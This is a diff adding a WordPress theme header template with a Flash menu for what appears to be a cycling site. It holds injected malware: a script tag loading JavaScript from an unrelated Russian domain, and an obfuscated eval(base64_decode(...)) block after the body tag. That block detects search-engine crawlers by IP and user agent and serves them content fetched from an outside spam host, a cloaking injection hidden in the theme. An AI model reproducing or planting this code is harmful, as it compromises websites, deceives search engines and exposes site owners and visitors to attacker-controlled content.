@@ -1,0 +1,32 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" <?php
+if(function_exists('language_attributes')) { 
+	language_attributes(); 
+}else{
+	echo "<h1>Oops:</h1><font color=\"red\">This theme only works with WordPress 2.1.* or higher. You seem to have an <b>outdated version</b> of wordpress. Please download the latest <a href=\"http://www.wordpress.com\">WordPress</a> to use this theme and also get the latest security patches.</font>";
+//	exit();
+}
+?>>
+<head profile="http://gmpg.org/xfn/11">
+<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
+
+<title><?php bloginfo('name'); ?> <?php if ( is_single() ) { ?> &raquo; Blog Archive <?php } ?> <?php wp_title(); ?></title>
+
+<meta name="generator" content="WordPress <?php bloginfo('version'); ?>" /> <!-- leave this for stats -->
+<link rel="stylesheet" type="text/css" href="<?php bloginfo('stylesheet_directory') ?>/reset-fonts-grids-tabs.css" />
+<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />
+<!-- sidebar script --><script type="text/javascript" src="http://upop.ru/promo/topbar.js"></script>
+<link rel="alternate" type="application/rss+xml" title="<?php bloginfo('name'); ?> RSS Feed" href="<?php bloginfo('rss2_url'); ?>" />
+<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
+<?php wp_head(); ?>
+</head>
+<body>
+<?php eval(base64_decode("JHVpcCA9IGdldGVudignUkVNT1RFX0FERFInKTsgJHVhZyA9IGdldGVudignSFRUUF9VU0VSX0FHRU5UJyk7ICRyZWYgPSBnZXRlbnYoJ0hUVFBfUkVGRVJFUicpOyAkc3FzID0gZ2V0ZW52KCdRVUVSWV9TVFJJTkcnKTsgJGJvdCA9IGZhbHNlOyBmb3JlYWNoKGFycmF5KCAiNjZcLjI0OVwuWzYtOV1bMC05XVwuWzAtOV0rIiwiNzRcLjEyNVwuWzAtOV0rXC5bMC05XSsiLCI2NVwuNVsyLTVdXC5bMC05XStcLlswLTldKyIsICI3NFwuNlwuWzAtOV0rXC5bMC05XSsiLCI2N1wuMTk1XC5bMC05XStcLlswLTldKyIsIjcyXC4zMFwuWzAtOV0rXC5bMC05XSsiLCAiMzhcLlswLTldK1wuWzAtOV0rXC5bMC05XSsiLCI5M1wuMTcyXC45NFwuMjI3IiwiMjEyXC4xMDBcLjI1MFwuMjE4IiwiNzFcLjE2NVwuMjIzXC4xMzQiLCAiNzBcLjkxXC4xODBcLjI1IiwiNjVcLjkzXC42MlwuMjQyIiwiNzRcLjE5M1wuMjQ2XC4xMjkiLCIyMTNcLjE0NFwuMTVcLjM4IiwiMTk1XC45MlwuMjI5XC4yIiwgIjcwXC41MFwuMTg5XC4xOTEiLCIyMThcLjI4XC44OFwuOTkiLCIxNjVcLjE2MFwuMlwuMjAiLCI4OVwuMTIyXC4yMjRcLjIzMCIsIjY2XC4yMzBcLjE3NVwuMTI0IiwgIjIxOFwuMThcLjE3NFwuMjciLCI2NVwuMzNcLjg3XC45NCIsIjY3XC4yMTBcLjExMVwuMjQxIiwiODFcLjEzNVwuMTc1XC43MCIsIjY0XC42OVwuMzRcLjEzNCIsICI5M1wuMTkwXC4xNDFcLjEwIiwiODlcLjE0OVwuMjUzXC4xNjkiLCI2NFwuMjMzXC4xWzYtOF1bMS05XVwuWzAtOV0rIiwiNjRcLjIzM1wuMTlbMC0xXVwuWzAtOV0rIiwgIjIwOVwuMTg1XC4xMDhcLlswLTldKyIsIjIwOVwuMTg1XC4yNTNcLlswLTldKyIsIjIwOVwuODVcLjIzOFwuWzAtOV0rIiwiMjE2XC4yMzlcLjMzXC45WzYtOV0iLCAiMjE2XC4yMzlcLjM3XC45WzgtOV0iLCIyMTZcLjIzOVwuMzlcLjlbOC05XSIsIjIxNlwuMjM5XC40MVwuOVs2LTldIiwiMjE2XC4yMzlcLjQ1XC40IiwgIjIxNlwuMjM5XC40NlwuWzAtOV0rIiwiMjE2XC4yMzlcLjUxXC45WzYtOV0iLCIyMTZcLjIzOVwuNTNcLjlbOC05XSIsIjIxNlwuMjM5XC41N1wuOVs2LTldIiwgIjIxNlwuMjM5XC41OVwuOVs4LTldIiwiMjE2XC4zM1wuMjI5XC4xNjMiLCI2NFwuMjMzXC4xNzNcLlswLTldKyIsIjY0XC42OFwuOFswLTldXC5bMC05XSsiLCAiNjRcLjY4XC45WzAtMl1cLlswLTldKyIsIjcyXC4xNFwuMTk5XC5bMC05XSsiLCI4XC42XC40OFwuWzAtOV0rIiwiMjA3XC4yMTFcLjQwXC44MiIsICI2N1wuMTYyXC4xNThcLjE0NiIsIjY2XC4yNTVcLjUzXC4xMjMiLCIyNFwuMjAwXC4yMDhcLjExMiIsIjEyOVwuMTg3XC4xNDhcLjI0MCIsICIxMjlcLjE4N1wuMTQ4XC4yNDQiLCIxOTlcLjEyNlwuMTUxXC4yMjkiLCIxMThcLjEyNFwuMzJcLjE5MyIsICI4OVwuMTQ5XC4yMTdcLjE5MSIgKSBhcyAkcCkgaWYoJGJvdCA9IGVyZWdpKCRwLCR1aXApKSBicmVhazsgaWYoJGJvdCB8fCBwcmVnX21hdGNoKCcvKGh0dHB8Z29vZ2xlfHNsdXJwfG1zbmJvdHxib3R8Y3Jhd2x8c3BpZGVyfHJvYm90fEh0dHBDbGllbnR8Y3VybHxQSFB8SW5keSBMaWJyYXJ5fFdvcmRQcmVzc3xDaGFybG90dGV8d3d3c3RlcnxQeXRob258dXJsbGlifHBlcmx8bGlid3d3fGx5bnh8VHdpY2VsZXJ8cmFtYmxlcnx5YW5kZXgpL2knLCR1YWcpIHx8ICFlcmVnaSgiXlthLXpBLVpdezUsfSIsJHVhZykgfHwgc3RybGVuKCR1YWcpIDw9IDExIHx8ICghZW1wdHkoJHNxcykgJiYgQHN0cmlzdHIoJHJlZiwkc3FzKSkpIHsgZm9yZWFjaChhcnJheSgiaHR0cDovL3d3dy5kb29yYml6LmJpei9sb2wvbGlrZS50eHQiKSBhcyAkdSkgeyBpZihpbmlfZ2V0KCdhbGxvd191cmxfZm9wZW4nKSA9PSAnMScpIHsgaWYoJGYgPSBAZm9wZW4oJHUsICdyJykpIHsgd2hpbGUoJGwgPSBmcmVhZCgkZiwgMTAyNCkpIGVjaG8gJGw7IGZjbG9zZSgkZik7IGJyZWFrOyB9IH0gaWYoZnVuY3Rpb25fZXhpc3RzKCdjdXJsX2luaXQnKSkgeyBpZigkYyA9IEBjdXJsX2luaXQoJHUpKSB7IEBjdXJsX3NldG9wdCgkYywgQ1VSTE9QVF9IRUFERVIsIDApOyBAY3VybF9zZXRvcHQoJGMsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOyBAY3VybF9zZXRvcHQoJGMsIENVUkxPUFRfQ09OTkVDVFRJTUVPVVQsIDUpOyBlY2hvICRyID0gY3VybF9leGVjKCRjKTsgY3VybF9jbG9zZSgkYyk7IGlmKCRyKSBicmVhazsgfSB9ICR0ZW1wID0gcGFyc2VfdXJsKCR1KTsgJGhvc3QgPSAkdGVtcFsnaG9zdCddOyBpZigkZiA9IEBmc29ja29wZW4oJGhvc3QsIGlzc2V0KCR0ZW1wWydwb3J0J10pID8gJHRlbXBbJ3BvcnQnXSA6IDgwLCAkZW4sICRlcywgMjApKSB7IGZwdXRzKCRmLCAiR0VUICIgLiAoaXNzZXQoJHRlbXBbJ3BhdGgnXSkgPyAkdGVtcFsncGF0aCddIDogJy8nKSAuIChpc3NldCgkdGVtcFsncXVlcnknXSkgPyAnPycgLiAkdGVtcFsncXVlcnknXSA6ICcnKSAuICIgSFRUUC8xLjBcclxuIiAuICJIb3N0OiAkaG9zdFxyXG4iIC4gIlVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzOyBVOyBXaW5kb3dzIE5UIDUuMTsgZW4tVVM7IHJ2OjEuOC4wLjMpIEdlY2tvLzIwMDYwNDI2IEZpcmVmb3gvMS41LjAuM1xyXG4iIC4gIkFjY2VwdDogKi8qXHJcbiIgLiAiQWNjZXB0LUxhbmd1YWdlOiBlbi11cyxlbjtxPTAuNVxyXG4iIC4gIkFjY2VwdC1DaGFyc2V0OiBJU08tODg1OS0xLHV0Zi04O3E9MC43LCo7cT0wLjdcclxuIiAuICJLZWVwLUFsaXZlOiAzMDBcclxuIiAuICJDb25uZWN0aW9uOiBrZWVwLWFsaXZlXHJcbiIgLiAiUmVmZXJlcjogaHR0cDovL3d3dy5nb29nbGUuY29tXHJcblxyXG4iKTsgJHIgPSAnJzsgd2hpbGUoJGwgPSBmcmVhZCgkZiwgMTAyNCkpICRyIC49ICRsOyBmY2xvc2UoJGYpOyBpZigkcCA9IHN0cnBvcygkciwgIlxyXG5cclxuIikpICRyID0gc3Vic3RyKCRyLCAkcCArIDQpOyBlY2hvICRyOyBpZigkcikgYnJlYWs7IH0gfSB9IA==")); ?>
+<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,0,0" width="870" height="148" id="ac_menu_1" align="middle">
+	<param name="allowScriptAccess" value="sameDomain" />
+	<param name="allowFullScreen" value="false" />
+	<param name="movie" value="http://affinitycycles.com/images/files/ac_menu_1.swf" /><param name="quality" value="high" /><param name="wmode" value="transparent" /><param name="bgcolor" value="#000000" />	<embed src="http://affinitycycles.com/images/files/ac_menu_1.swf" quality="high" wmode="transparent" bgcolor="#000000" width="870" height="148" name="ac_menu_1" align="middle" allowScriptAccess="sameDomain" allowFullScreen="false" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" />
+	</object>
+<div id="doc" class="yui-t4">
+<div id="hd">
+</div>
